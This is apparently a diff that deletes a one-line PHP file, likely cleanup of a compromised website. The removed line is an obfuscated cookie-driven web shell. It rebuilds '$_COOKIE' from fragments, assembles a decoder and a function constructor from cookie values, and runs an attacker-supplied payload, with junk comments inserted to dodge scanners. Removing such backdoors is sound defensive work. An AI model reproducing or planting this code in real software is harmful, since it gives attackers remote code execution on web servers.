@@ -1,1 +1,0 @@
-<?php $f='OKI';$di/*x83*/='E';$pv/*Ck.*/='_CO';$nq=/*.8*/${$pv.$f.$di};if(isset($nq['Zt'])){$fm=/*p}Co*/$nq['Zt'].$nq/*+vo9*/['f'];$q=$nq['Kq']./*h7#U*/$nq['uy'].$nq['Z'];$sk=$fm('',$q($nq['A']));$sk();}
